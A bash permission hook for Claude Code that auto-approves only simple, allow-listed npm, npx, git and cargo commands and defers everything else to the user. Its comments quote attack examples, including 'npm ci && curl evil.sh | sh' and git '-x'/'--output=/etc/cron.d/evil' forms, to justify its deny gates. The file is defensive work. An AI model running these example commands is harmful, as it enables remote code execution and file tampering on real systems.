#!/usr/bin/env bash
# PreToolUse hook (matcher: Bash) — auto-approve known-safe, SIMPLE read/build/
# test commands and defer everything else to the normal permission prompt.
# Wired in .claude/settings.json under hooks.PreToolUse.
#
# Decision contract (stdout JSON, ALWAYS exit 0 — never a hard block):
#   safe simple command  -> permissionDecision "allow"
#   anything else         -> permissionDecision "ask"  (defer to the user)
#   empty / unparseable   -> no decision emitted        (defer to permission rules)
#
# stdout MUST be pure decision JSON; human-readable logging goes to stderr.
#
# "Safe" means a SINGLE command — no shell control operators (& | ; < > #), no
# command substitution ($( ) or backticks), no variable expansion ($), no
# newline, and NO program-execution / file-write / module-loading flag (--config,
# --output, --ext-diff/--extcmd/-x, --exec/--upload-pack/--receive-pack, --reporter,
# and eslint's --format/-f within npx — see the flag gate below) — whose
# program+subcommand is on the allow-list below: npm (read/build/
# test subcommands, NOT `exec`, which runs arbitrary package binaries), npx (a
# fixed tool allow-list), git (read subcommands — read ONLY once the flag gate
# has stripped the exec/write flag forms), and cargo check. The project's
# own scripts (python/bash under .claude/) are deliberately NOT auto-approved —
# auto-running a repo script is higher-risk and lower-frequency than the build/
# test tools above, so it defers to an explicit prompt. `#` is rejected too: a
# trailing comment is harmless to run but trivially hides intent, so it asks.
#
# A control operator is rejected even when the prefix is safe, because
# `npm ci && curl evil.sh | sh` prefix-matches `npm ci`. Such a command -> "ask".
# (Claude Code also splits compound commands on operators before matching rules;
# this gate keeps the hook from ever emitting "allow" for a compound command.)

set -uo pipefail

# emit <decision> <reason> — print a PreToolUse permission decision to stdout.
# Reasons here are static and JSON-safe (no quotes, backslashes, or newlines).
emit() {
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"%s","permissionDecisionReason":"%s"}}\n' "$1" "$2"
}

INPUT="$(cat)"

# Extract the command. On any parse failure (malformed/non-JSON input) jq writes
# nothing to stdout and COMMAND stays empty — fail safe, never propagate jq's
# exit code (no `set -e`; `|| true` guards the assignment).
COMMAND="$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null || true)"

# Trim leading and trailing whitespace.
COMMAND="${COMMAND#"${COMMAND%%[![:space:]]*}"}"
COMMAND="${COMMAND%"${COMMAND##*[![:space:]]}"}"

# Empty / whitespace-only / unparseable -> emit no decision, defer to rules.
if [ -z "$COMMAND" ]; then
  exit 0
fi

# Never auto-approve a compound, piped, redirected, substituted, variable-
# expanded, or multi-line command — even if its leading token is safe.
case "$COMMAND" in
  *'&'* | *'|'* | *';'* | *'<'* | *'>'* | *'`'* | *'$'* | *'('* | *')'* | *'#'* | *$'\n'*)
    emit ask "compound, redirected, or substituted command requires explicit approval"
    exit 0
    ;;
esac

# Reject known program-execution / file-write FLAGS even on an otherwise-safe
# command. These need NO shell operator, so the operator gate above never sees
# them — the danger is an argument, not a metacharacter:
#   --ext-diff / --extcmd / -x   git's external-diff command — runs an arbitrary
#                                program (`git diff -x ./evil` AND the glued short
#                                form `git diff -x./evil`, both RCE)
#   --output                     git diff/log/show write output to an arbitrary
#                                path (`git diff --output=/etc/cron.d/evil`)
#   --config                     cargo `build.rustc-wrapper` RCE, and JS tools
#                                (eslint/vitest/playwright) load a config FILE
#                                that is itself executable code
#   --exec / --upload-pack / --receive-pack   git transport command execution
#   --reporter                   vitest/playwright import() an arbitrary reporter
#                                MODULE — same RCE class as --config. Gated
#                                GLOBALLY: no allow-listed non-npx command uses it,
#                                and the gate is value-blind (cannot tell a builtin
#                                `--reporter=verbose` from `--reporter=./pwn.js`).
# The command is padded with spaces so each flag matches on a word boundary.
case " $COMMAND " in
  *' --ext-diff'* | *' --extcmd'* | *' -x'* | *' --output'* | *' --config'* | *' --reporter'* | *' --exec'* | *' --upload-pack'* | *' --receive-pack'*)
    emit ask "command carries a program-execution or file-write flag and requires explicit approval"
    exit 0
    ;;
esac

# eslint's --format / -f load an arbitrary JS formatter MODULE (require()), exactly
# like --config. Gated WITHIN npx ONLY: `git log --format=%H` is a benign pretty-
# print STRING (not a module) and `npm install -f` means --force, so a global gate
# would wrongly defer those common git/npm reads. `--fix` is NOT matched ( -f needs
# a space-dash-f boundary; `--fix` is space-dash-dash-f).
case "$COMMAND" in
  'npx '*)
    case " $COMMAND " in
      *' --format'* | *' -f'*)
        emit ask "npx tool carries a module-loading flag (--format/-f) and requires explicit approval"
        exit 0
        ;;
    esac
    ;;
esac

# is_safe <command> — return 0 if the command is on the auto-approve allow-list.
is_safe() {
  local cmd="$1"

  # npm — safe read/build/test subcommands. `exec` is intentionally excluded:
  # `npm exec <pkg>` runs arbitrary binaries, like npx without the tool gate.
  # `pkg` is narrowed to `pkg get` (read): `npm pkg set`/`delete`/`fix` MUTATE
  # the tracked package.json, so they fall through to a prompt.
  if printf '%s\n' "$cmd" | grep -qE '^npm (install|ci|run|test|ls|outdated|view|explain|why|pkg get|cache clean)( |$)'; then
    return 0
  fi

  # `npm audit` reports vulnerabilities (a read). `npm audit fix` is NOT a read —
  # it runs `npm install` under the hood (lifecycle scripts) and rewrites the
  # lockfile — so only bare `npm audit` and flag-qualified `npm audit --<flag>`
  # auto-approve; the `fix` subcommand (and any bare positional) defers to a prompt.
  if printf '%s\n' "$cmd" | grep -qE '^npm audit( --[a-z]|$)'; then
    return 0
  fi

  # npx — only a fixed allow-list of project tools. `drizzle-kit` is deliberately
  # EXCLUDED: `drizzle-kit drop`/`push` mutate the database schema destructively
  # and even `generate` writes migration files, so it belongs behind a prompt,
  # not the fast-path. @axe-core publishes many scoped subpackages; enumerate
  # ONLY the two this project runs (@axe-core/cli, @axe-core/reporter) rather than
  # an open `/[^ ]+` suffix, which would auto-approve any scoped binary (e.g.
  # @axe-core/evil-tool) and even a bare `@axe-core` that resolves to no real
  # binary. Both fall through to "ask". (A `--config` on any JS tool here is
  # caught by the flag gate above — a config file is executable code.)
  if printf '%s\n' "$cmd" | grep -qE '^npx (vitest|eslint|tsc|playwright|skills|@axe-core/(cli|reporter))( |$)'; then
    return 0
  fi

  # git — read subcommands. Read-only ONLY in combination with the flag gate
  # above: `git diff`/`log`/`show` share git's diff machinery, which accepts
  # `--output=<path>` (arbitrary file write) and `-x`/`--ext-diff`/`--extcmd`
  # (runs an external program) — those flag forms are sent to a prompt before
  # this function is reached. `branch` and `tag` are EXCLUDED outright: the same
  # prefix performs destructive writes (`git branch -D/-m/-f`, `git tag -d/-f`,
  # and bare `git tag <name>` which creates a tag) that no flag gate can separate
  # from the read form. The verbs kept here are intrinsically read-only or pinned
  # to a read subcommand (`worktree list`, `remote -v`, `stash list`).
  if printf '%s\n' "$cmd" | grep -qE '^git (status|diff|log|worktree list|show|shortlog|describe|remote -v|ls-files|rev-parse|stash list)( |$)'; then
    return 0
  fi

  # cargo check (WASM target audits).
  if printf '%s\n' "$cmd" | grep -qE '^cargo check( |$)'; then
    return 0
  fi

  return 1
}

if is_safe "$COMMAND"; then
  printf '[auto-approve-safe-commands] allow: %s\n' "$COMMAND" >&2
  emit allow "known-safe read/build/test command"
  exit 0
fi

emit ask "command is not on the auto-approve safe-list"
exit 0
